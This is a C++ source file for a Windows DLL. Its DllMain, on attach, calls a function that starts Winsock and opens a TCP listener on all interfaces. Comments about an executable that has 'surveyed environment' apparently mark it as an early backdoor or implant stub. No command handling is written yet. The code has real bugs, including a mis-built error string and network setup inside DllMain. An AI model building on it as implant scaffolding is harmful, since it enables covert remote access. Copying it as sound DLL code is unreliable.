// Patrick Sacchet
// Defines the entry point for the DLL application; main handler for user specific calls
#include "pch.h"
#include "debug.h"
#include "dllmain.h"


BOOL startListen(fstream &debugFile)
{
    WORD wsaVersion;
    WSADATA wsaData;
    int status = 0;

    wsaVersion = MAKEWORD(2, 2);

    status = WSAStartup(wsaVersion, &wsaData);
    if (status)
    {
        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Wsastartup did not complete successfully \n");
        string errorCode = "Error code: %u \n", status;
        InternalDebug::DebugOutput::writeFile(debugFile,errorCode);
        return FALSE;
    }
    InternalDebug::DebugOutput::writeFile(debugFile, "WSAStartup was successful \n");
    std::cout << "WSAStartup was successful \n";

    // Information for target
    SOCKADDR_IN client;

    client.sin_family = AF_INET;
    client.sin_port = htons(PORT_NUM);
    // Accept any IP address
    client.sin_addr.s_addr = htonl(INADDR_ANY);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET)
    {
        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Could not successfully create socket \n");
        return FALSE;
    }

    if (bind(sock, (LPSOCKADDR)&client, sizeof(client)) == SOCKET_ERROR)
    {
        InternalDebug::DebugOutput::writeFile(debugFile, "ERROR: Could not bind socket \n");
        return FALSE;
    }
    std::cout << "Listening on port... \n";

    listen(sock, SOMAXCONN);

    // Parse initial packet data and call appropiate handler from here

    return TRUE;
}



BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        BOOL status;
        // Executable has surveyed environment and deemed it safe to operate; make calls specific to functionality here
        case DLL_PROCESS_ATTACH:
        {
            std::cout << "INSIDE DLLMAIN \n";
            // Pass control to our listening function and wait for user input 
            fstream debugFile = InternalDebug::DebugOutput::createDebugFile();
            status = InternalDebug::DebugOutput::writeFile(debugFile, "test \n");
            if (!status)
            {
                break;
            }
            status = startListen(debugFile);
            break;
        }
        case DLL_THREAD_ATTACH:
        {
            // Pass control to our listening function and wait for user input 
            fstream debugFile = InternalDebug::DebugOutput::createDebugFile();
            status = InternalDebug::DebugOutput::writeFile(debugFile, "test \n");
            if (!status)
            {
                break;
            }
            status = startListen(debugFile);
            break;
            break;
        }
        case DLL_THREAD_DETACH:
        {
            break;
        }
        // General cleanup before detaching and de-loading out of memory
        case DLL_PROCESS_DETACH:
        {
            break;
        }
    }

    return TRUE;
}

